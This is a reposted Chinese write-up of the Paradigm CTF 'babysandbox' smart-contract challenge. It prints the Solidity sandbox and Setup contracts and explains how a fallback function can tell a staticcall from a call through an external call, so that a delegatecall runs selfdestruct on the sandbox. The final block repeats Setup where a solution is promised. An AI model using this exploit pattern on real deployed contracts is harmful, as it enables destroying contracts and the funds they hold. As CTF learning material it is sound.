> 原文链接: https://www.anquanke.com//post/id/250115 


# paradigm-CTF babysandbox


                                阅读量   
                                **18694**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t011913e4a58b91487d.jpg)](https://p3.ssl.qhimg.com/t011913e4a58b91487d.jpg)

> 前言：找Ver👴想复现下qwb final的区块链。Ver👴给我发了这个比赛下面的一道题，发现这个比赛里面有很多高质量的智能合约题。从这里开始写一些不错的题目。

## babysandbox

看到题目名字就知道了题目考点： 沙盒<br>
给出合约<br>
BabySandbox.sol

```
pragma solidity 0.7.0;

contract BabySandbox `{`
    function run(address code) external payable `{`
        assembly `{`
            // if we're calling ourselves, perform the privileged delegatecall
            if eq(caller(), address()) `{`
                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)
                    case 0 `{`
                        returndatacopy(0x00, 0x00, returndatasize())
                        revert(0x00, returndatasize())
                    `}`
                    case 1 `{`
                        returndatacopy(0x00, 0x00, returndatasize())
                        return(0x00, returndatasize())
                    `}`
            `}`

            // ensure enough gas
            if lt(gas(), 0xf000) `{`
                revert(0x00, 0x00)
            `}`

            // load calldata
            calldatacopy(0x00, 0x00, calldatasize())

            // run using staticcall
            // if this fails, then the code is malicious because it tried to change state
            if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) `{`
                revert(0x00, 0x00)
            `}`

            // if we got here, the code wasn't malicious
            // run without staticcall since it's safe
            switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)
                case 0 `{`
                    returndatacopy(0x00, 0x00, returndatasize())
                    // revert(0x00, returndatasize())
                `}`
                case 1 `{`
                    returndatacopy(0x00, 0x00, returndatasize())
                    return(0x00, returndatasize())
                `}`
        `}`
    `}`
`}`
```

Setup.sol

```
pragma solidity 0.7.0;

import "./BabySandbox.sol";

contract Setup `{`
    BabySandbox public sandbox;

    constructor() `{`
        sandbox = new BabySandbox();
    `}`

    function isSolved() public view returns (bool) `{`
        uint size;
        assembly `{`
            size := extcodesize(sload(sandbox.slot))
        `}`
        return size == 0;
    `}`
`}`
```

Setup.py中的isSolved()进行了是否成功解决challenge的check.<br>
这里我不是很熟悉.slot这种用法，所以自己随便部署了一个进行试验。

[![](https://p3.ssl.qhimg.com/t01fc865c3552344b5e.png)](https://p3.ssl.qhimg.com/t01fc865c3552344b5e.png)

应该就是取了题目合约的整个字节码。要求把合约变成一个账户。或者直接让合约自毁应该也可以。<br>
然后我们分析下Sandbox中的各种方法

```
if eq(caller(), address()) `{`
                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)
                    case 0 `{`
                        returndatacopy(0x00, 0x00, returndatasize())
                        revert(0x00, returndatasize())
                    `}`
                    case 1 `{`
                        returndatacopy(0x00, 0x00, returndatasize())
                        return(0x00, returndatasize())
                    `}`
            `}`
```

这里说的是如果caller也就是调用者是自己的话。那么就会直接调用。<br>
delegatecall，也就是如果这里能设置出一些东西那么就可以成功改变合约状态了。

```
if lt(gas(), 0xf000) `{`
                revert(0x00, 0x00)
            `}`

            // load calldata
            calldatacopy(0x00, 0x00, calldatasize())

            // run using staticcall
            // if this fails, then the code is malicious because it tried to change state
            if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) `{`
                revert(0x00, 0x00)
            `}`

            // if we got here, the code wasn't malicious
            // run without staticcall since it's safe
            switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)
                case 0 `{`
                    returndatacopy(0x00, 0x00, returndatasize())
                    // revert(0x00, returndatasize())
                `}`
                case 1 `{`
                    returndatacopy(0x00, 0x00, returndatasize())
                    return(0x00, returndatasize())
                `}`
        `}`
```

第一行检测了gas是否够用，然后calldatacopy<br>
从调用数据的位置 f 的拷贝 s 个字节到内存的位置 t<br>
之后他就会利用staticall继续进行检测，但是我们可以发现，他从这里进入的staticcall 是进入了 自己的合约。 相当于对自己进行了一次重入。重入之后的调用方，就是msg.sender了。也就是可以正常进入delegatecall了。<br>
但是他利用的是staticcall在外层,所以还是不能改变合约的原有状态。

但是通过之后 他利用call进行了第二次的合约使用。也就是这里的delegatecall就可以完成任何想做的事情了。也就是我们想要的合约销毁。

那么到这里 整体的思路就很清晰了：

> <ol>
- 首先进入run(address target)中，delegatecall无法进入，进入staticcall
- staticall中进入delegatecall 完成一次调用。
- call中进入delegatecall完成一次调用。
- 需要一个函数在staticcall中不改变合约状态，在call中改变。
- delegatecall的target只需要直接selfdestruct就可以了。
</ol>

那么现在就考虑怎么给出一个办法，使得两次调用所执行的方法不同？<br>
尝试思路：
<li>我们考虑到利用全局变量进行赋值。但是可想而知这个方法并不可靠。因为我们是需要staticall通过检测的，全局变量赋值还是改变了合约的原有状态。
<pre><code class="hljs javascript">function()payable external`{`
 if(success==true)`{`
 selfdestruct(msg.sender);
 `}`
 else`{`
 success=true;
 `}`
`}`
</code></pre>
也就是利用类似上述的伪代码。这里是不可做的。
</li>
1. 利用特征进行判断。但是我们可以看到每次进行交易不管是传的gas还是什么所有的call和staticall中的特征都完全相同。 所以这个方法也很难进行bypass。
```
if(gas&gt;value)`{`
return ;
`}`
else`{`
selfdestruct(msg.sender);
`}`
```

考虑使用call外部变量进行改变，这种是可行的一个办法。我们可以通过在外部合约设置一个方法 我们利用内部的call方法进行请求，如果能正确返回状态值则代表当前状态就是call了。<br>
因为外部Call方法的状态即使revert()他也会只返回一个状态码0，并不会直接阻断整个交易的正常运行。

```
fallback()external payable`{`
        bool success;
        (success,)=address(0x3c725134d74D5c45B4E4ABd2e5e2a109b5541288).call("");
        if(!success)`{`
            return;
        `}`
        else`{`
            selfdestruct(address(0));
        `}`

    `}`
```

[![](https://p1.ssl.qhimg.com/t01c434d26adc035fea.png)](https://p1.ssl.qhimg.com/t01c434d26adc035fea.png)

这样就成功绕过了沙箱

这个是从github的官方wp中学到的 ，感觉应该和3的意思相同? 用等同于python的语法try catch 这样可以直接避免直接revert()

```
contract Setup `{`
 BabySandbox public sandbox;

 constructor() `{`
     sandbox = new BabySandbox();
 `}`

 function isSolved() public view returns (bool) `{`
     uint size;
     assembly `{`
         size := extcodesize(sload(sandbox.slot))
     `}`
     return size == 0;
 `}`
`}`
```

学到了很多opcode以及call staticcall delegatecall的知识。
